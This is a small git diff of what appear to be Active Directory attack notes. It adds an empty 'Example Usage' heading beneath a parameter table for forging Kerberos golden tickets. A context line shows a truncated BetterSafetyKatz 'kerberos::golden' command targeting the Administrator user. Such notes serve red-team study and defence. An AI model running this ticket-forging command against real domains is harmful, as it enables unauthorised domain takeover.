@@ -103,6 +103,12 @@ $ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain
 |   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |
 
 
+**_Example Usage -:_**
+
+
+
+
+
 
 
 
